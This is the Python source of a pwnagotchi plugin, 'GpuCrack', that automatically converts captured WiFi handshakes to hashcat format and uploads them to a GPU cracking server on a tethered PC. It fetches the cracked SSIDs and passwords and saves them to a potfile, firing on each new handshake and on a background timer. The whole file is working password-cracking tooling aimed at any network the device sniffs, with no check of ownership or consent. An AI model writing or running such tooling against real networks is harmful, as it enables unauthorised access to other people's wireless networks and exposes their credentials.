import os
import subprocess
import requests
import logging
import json
import time
from threading import Lock, Thread, Event
from pwnagotchi.plugins import Plugin
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts


class GpuCrack(Plugin):
    __author__ = 'charveey'
    __version__ = '2.4.0'
    __license__ = 'GPL3'
    __description__ = (
        'Sends uncracked handshakes to a GPU cracking server on your PC via USB gadget. '
        'Shows hashcat status on the display.'
    )

    POTFILE_PATH  = '/root/handshakes/cracked.pwngpu.potfile'
    STATUS_PATH   = '/root/handshakes/.pwngpu_crack_status.json'
    USB_IFACE     = 'usb0'
    USB_OWN_IP    = '10.0.0.2'   # pwnagotchi's static IP on the USB link
    USB_GATEWAY   = '10.0.0.1'   # PC's IP — where the crack server lives
    POLL_INTERVAL = 60            # seconds between background USB checks

    def __init__(self):
        self.lock         = Lock()
        self.last_run     = 0
        self.sent         = set()
        self.ui_status    = 'GPU: waiting'
        self._status      = 'waiting'
        self._agent       = None
        self._stop_event  = Event()
        self._poll_thread = None
        self._load_status()

    # ------------------------------------------------------------------ #
    #  Status helper                                                       #
    # ------------------------------------------------------------------ #

    def _set_status(self, state: str, detail: str = ''):
        self._status   = state
        label_map = {
            'waiting':    'GPU: waiting',
            'no_usb':     'GPU: no USB',
            'connecting': 'GPU: connecting',
            'offline':    'GPU: offline',
            'online':     'GPU: online',
            'scanning':   'GPU: scanning',
            'uploading':  f'GPU: up {detail}',
            'cracking':   f'GPU: crack {detail}',
            'cracked':    f'GPU: {detail} cracked!',
            'no_match':   'GPU: no match',
            'results':    f'GPU: {detail} total',
            'error':      f'GPU: err {detail}',
        }
        self.ui_status = label_map.get(state, f'GPU: {state}')
        # Use INFO so status changes always appear in logs without
        # needing debug-level logging enabled on the pwnagotchi.
        logging.info(f"[pwngpu] {self.ui_status}")

    # ------------------------------------------------------------------ #
    #  Lifecycle                                                           #
    # ------------------------------------------------------------------ #

    def on_loaded(self):
        if not self.options.get('api_key'):
            logging.error("[pwngpu] Missing required config field: api_key")
            return
        self._set_status('waiting')
        self._stop_event.clear()
        self._poll_thread = Thread(target=self._poller, daemon=True, name='pwngpu-poll')
        self._poll_thread.start()
        logging.info(f"[pwngpu] Plugin v{self.__version__} loaded — poller every {self.POLL_INTERVAL}s.")

    def on_unload(self, ui):
        self._stop_event.set()
        if self._poll_thread:
            self._poll_thread.join(timeout=5)
        with ui._lock:
            try:
                ui.remove_element('pwngpu_crack_status')
            except KeyError:
                pass
        logging.info("[pwngpu] Plugin unloaded.")

    # ------------------------------------------------------------------ #
    #  Background poller                                                   #
    # ------------------------------------------------------------------ #

    def _poller(self):
        """
        Lightweight daemon thread — wakes every POLL_INTERVAL seconds.

        In the field (USB down):  one 'ip addr' subprocess → sleep. Cheap.
        Tethered, during cooldown: USB check only, no HTTP. Display unchanged.
        Tethered, cooldown elapsed: triggers a full _run() sync.

        The poller also acts as the primary sync trigger on boot when
        the pwnagotchi starts already tethered and no hooks have fired yet.
        In that case self._agent is None, so we attempt to get the agent
        from the pwnagotchi singleton directly.
        """
        # No initial delay — check immediately so the display updates fast
        # on boot when USB is already connected.
        while not self._stop_event.is_set():
            try:
                self._poll_tick()
            except Exception as e:
                logging.error(f"[pwngpu] poller error: {e}")
            self._stop_event.wait(self.POLL_INTERVAL)

    def _poll_tick(self):
        # Step 1 — USB check. Cheap, always first.
        if not self._usb_connected():
            # Display already set to 'no_usb' inside _usb_connected().
            return

        # Step 2 — Try to get the agent if we don't have it yet.
        # pwnagotchi exposes its global agent via pwnagotchi.agent.
        if self._agent is None:
            try:
                import pwnagotchi
                self._agent = pwnagotchi.agent()
                logging.info("[pwngpu] Agent acquired from pwnagotchi singleton.")
            except Exception:
                # Agent not ready yet — stay on 'waiting', not 'connecting',
                # so the display is honest about what's happening.
                self._set_status('waiting')
                logging.debug("[pwngpu] Agent not ready yet, will retry.")
                return

        # Step 3 — Check cooldown. During cooldown leave the display alone.
        sleep   = self.options.get('sleep', 1800)
        elapsed = time.time() - self.last_run
        if elapsed < sleep:
            logging.debug(f"[pwngpu] Cooldown: {int(sleep - elapsed)}s remaining.")
            return

        # Step 4 — Trigger a full sync if nothing else is already running.
        if not self.lock.locked():
            logging.info("[pwngpu] Poller triggering sync.")
            self._run(self._agent)
            self.last_run = time.time()

    # ------------------------------------------------------------------ #
    #  UI                                                                  #
    # ------------------------------------------------------------------ #

    def on_ui_setup(self, ui):
        if ui.is_waveshare_v2() or ui.is_waveshare_v3() or ui.is_waveshare_v4():
            pos = (0, 128)
        elif ui.is_waveshare_v1():
            pos = (0, 128)
        elif ui.is_waveshare144lcd():
            pos = (0, 104)
        elif ui.is_inky():
            pos = (0, 96)
        elif ui.is_waveshare27inch():
            pos = (0, 165)
        else:
            pos = (0, 128)

        ui.add_element('pwngpu_crack_status', LabeledValue(
            color=BLACK,
            label='',
            value=self.ui_status,
            position=pos,
            label_font=fonts.Bold,
            text_font=fonts.Small
        ))

    def on_ui_update(self, ui):
        ui.set('pwngpu_crack_status', self.ui_status)

    # ------------------------------------------------------------------ #
    #  Hooks                                                               #
    # ------------------------------------------------------------------ #

    def on_handshake(self, agent, filename, access_point, client_station):
        """New handshake — always upload immediately, bypasses cooldown."""
        self._agent = agent
        if not self._usb_connected():
            return
        if self.lock.locked():
            logging.debug("[pwngpu] on_handshake: sync already running, skipping.")
            return
        logging.info(f"[pwngpu] New handshake: {filename} — triggering immediate sync.")
        self._run(agent)
        self.last_run = time.time()

    def on_internet_available(self, agent):
        self._maybe_run(agent, source='on_internet_available')

    def on_epoch(self, agent, epoch, epoch_data):
        self._maybe_run(agent, source=f'on_epoch({epoch})')

    def _maybe_run(self, agent, source='hook'):
        """Store agent; trigger a sync if cooldown has elapsed."""
        self._agent = agent
        if not self._usb_connected():
            return
        if self.lock.locked():
            return
        sleep   = self.options.get('sleep', 1800)
        elapsed = time.time() - self.last_run
        if elapsed < sleep:
            logging.debug(f"[pwngpu] {source}: cooldown {int(sleep - elapsed)}s remaining.")
            return
        logging.info(f"[pwngpu] {source}: triggering sync.")
        self._run(agent)
        self.last_run = time.time()

    # ------------------------------------------------------------------ #
    #  USB detection                                                       #
    # ------------------------------------------------------------------ #

    def _usb_connected(self):
        """
        Returns True only if usb0 is up with exactly 10.0.0.2 assigned.
        Matching the exact static IP avoids false positives from a
        misconfigured interface while being reliable for this fixed setup.
        """
        try:
            result = subprocess.run(
                ['ip', 'addr', 'show', self.USB_IFACE],
                capture_output=True, text=True, timeout=3
            )
            if result.returncode != 0 or f'inet {self.USB_OWN_IP}' not in result.stdout:
                if self._status != 'no_usb':
                    logging.info("[pwngpu] USB not connected.")
                self._set_status('no_usb')
                return False
            if self._status == 'no_usb':
                logging.info(f"[pwngpu] USB connected: {self.USB_OWN_IP}")
            return True
        except Exception as e:
            logging.debug(f"[pwngpu] USB check error: {e}")
            self._set_status('no_usb')
            return False

    def _get_server_url(self):
        url = self.options.get('server_url', '').rstrip('/')
        if not url:
            port = self.options.get('port', 6881)
            url  = f"http://{self.USB_GATEWAY}:{port}"
        return url

    # ------------------------------------------------------------------ #
    #  Status persistence                                                  #
    # ------------------------------------------------------------------ #

    def _load_status(self):
        if not os.path.exists(self.STATUS_PATH):
            return
        try:
            with open(self.STATUS_PATH, 'r') as f:
                data = json.load(f)
                self.sent = set(data.get('sent', []))
            logging.info(f"[pwngpu] Loaded {len(self.sent)} previously sent entries.")
        except Exception as e:
            logging.warning(f"[pwngpu] Could not load status: {e}")
            self.sent = set()

    def _save_status(self):
        try:
            with open(self.STATUS_PATH, 'w') as f:
                json.dump({'sent': list(self.sent)}, f)
        except Exception as e:
            logging.warning(f"[pwngpu] Could not save status: {e}")

    # ------------------------------------------------------------------ #
    #  Core sync logic                                                     #
    # ------------------------------------------------------------------ #

    def _run(self, agent):
        with self.lock:
            server_url    = self._get_server_url()
            api_key       = self.options['api_key']
            config        = agent.config()
            handshake_dir = config['bettercap']['handshakes']
            whitelist     = self.options.get('whitelist', [])

            # 1. Ping server
            self._set_status('connecting')
            if not self._ping_server(server_url, api_key):
                logging.warning(f"[pwngpu] Server unreachable at {server_url}")
                self._set_status('offline')
                return
            logging.info(f"[pwngpu] Server online at {server_url}")

            # 2. Scan for unsent pcaps
            self._set_status('scanning')
            try:
                all_pcaps = os.listdir(handshake_dir)
            except Exception as e:
                logging.error(f"[pwngpu] Cannot read handshake dir {handshake_dir}: {e}")
                self._set_status('error', 'dir')
                return

            pcaps = [
                f for f in all_pcaps
                if f.endswith('.pcap')
                and f not in self.sent
                and not any(w in f for w in whitelist)
            ]
            logging.info(f"[pwngpu] {len(pcaps)} unsent pcap(s) found (total in dir: {len(all_pcaps)}).")

            if not pcaps:
                self._fetch_and_save_results(server_url, api_key)
                return

            # 3. Convert and upload
            total_new = 0

            for i, pcap_file in enumerate(pcaps, 1):
                pcap_path = os.path.join(handshake_dir, pcap_file)
                hc_path   = pcap_path.replace('.pcap', '.tmp.hc22000')
                short     = pcap_file[:12]

                logging.info(f"[pwngpu] [{i}/{len(pcaps)}] Converting {pcap_file}")
                self._set_status('uploading', f"{i}/{len(pcaps)}")
                hashes = self._convert(pcap_path, hc_path)

                if not hashes:
                    logging.info(f"[pwngpu] No hashes extracted from {pcap_file}, marking sent.")
                    self.sent.add(pcap_file)
                    continue

                logging.info(f"[pwngpu] [{i}/{len(pcaps)}] Uploading {pcap_file} ({len(hashes)} hash lines)")
                self._set_status('cracking', short)
                success, cracked_count = self._send(server_url, api_key, hc_path, pcap_file)

                if success:
                    self.sent.add(pcap_file)
                    total_new += cracked_count
                    logging.info(f"[pwngpu] {pcap_file} queued on server. Immediate cracked: {cracked_count}")

                if os.path.exists(hc_path):
                    os.remove(hc_path)

            # 4. Final status
            self._save_status()
            if total_new > 0:
                self._set_status('cracked', str(total_new))
            else:
                self._set_status('no_match')

            # 5. Pull accumulated results from server
            self._fetch_and_save_results(server_url, api_key)

    # ------------------------------------------------------------------ #
    #  Network helpers                                                     #
    # ------------------------------------------------------------------ #

    def _ping_server(self, server_url, api_key):
        try:
            r = requests.get(
                f"{server_url}/health",
                headers={'X-API-Key': api_key},
                timeout=5
            )
            return r.status_code == 200
        except Exception as e:
            logging.debug(f"[pwngpu] Health check failed: {e}")
            return False

    def _send(self, server_url, api_key, hc_path, original_name):
        try:
            with open(hc_path, 'rb') as f:
                response = requests.post(
                    f"{server_url}/crack",
                    headers={'X-API-Key': api_key},
                    files={
                        'file': (
                            original_name.replace('.pcap', '.hc22000'),
                            f,
                            'application/octet-stream'
                        )
                    },
                    timeout=60
                )
            response.raise_for_status()
            data = response.json()
            if data.get('cracked'):
                self._save_results(data['cracked'])
            return True, data.get('total', 0)
        except requests.exceptions.ConnectionError:
            logging.warning("[pwngpu] Connection error during send.")
            self._set_status('offline')
        except requests.exceptions.Timeout:
            logging.warning("[pwngpu] Server timed out during send.")
            self._set_status('error', 'timeout')
        except Exception as e:
            logging.error(f"[pwngpu] Send error: {e}")
            self._set_status('error', 'send')
        return False, 0

    def _convert(self, pcap_path, hc_path):
        try:
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hc_path, pcap_path],
                capture_output=True, text=True, timeout=60
            )
            logging.debug(f"[pwngpu] hcxpcapngtool stdout: {result.stdout.strip()}")
            if os.path.exists(hc_path) and os.path.getsize(hc_path) > 0:
                with open(hc_path, 'r') as f:
                    return [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            logging.error("[pwngpu] hcxpcapngtool not found — is it installed?")
            self._set_status('error', 'no hcxtool')
        except Exception as e:
            logging.error(f"[pwngpu] Conversion error: {e}")
            self._set_status('error', 'convert')
        return []

    def _fetch_and_save_results(self, server_url, api_key):
        try:
            r = requests.get(
                f"{server_url}/results",
                headers={'X-API-Key': api_key},
                timeout=10
            )
            r.raise_for_status()
            cracked = r.json().get('cracked', [])
            count   = len(cracked)
            if cracked:
                self._save_results(cracked)
            self._set_status('results', str(count))
            logging.info(f"[pwngpu] {count} total cracked result(s) on server.")
        except Exception as e:
            logging.warning(f"[pwngpu] Could not fetch results: {e}")

    def _save_results(self, cracked):
        if not cracked:
            return
        existing = set()
        if os.path.exists(self.POTFILE_PATH):
            with open(self.POTFILE_PATH, 'r', encoding='utf-8') as f:
                existing = set(line.strip() for line in f if line.strip())
        new_lines = []
        for entry in cracked:
            ssid     = entry.get('ssid', 'unknown')
            bssid    = entry.get('bssid', '00:00:00:00:00:00')
            password = entry.get('password', '')
            if not password:
                continue
            line = f"{bssid}:{bssid}:{ssid}:{password}"
            if line not in existing:
                new_lines.append(line)
                existing.add(line)
        if new_lines:
            with open(self.POTFILE_PATH, 'a', encoding='utf-8') as f:
                for line in new_lines:
                    f.write(line + '\n')
            logging.info(f"[pwngpu] Saved {len(new_lines)} new password(s) to potfile.")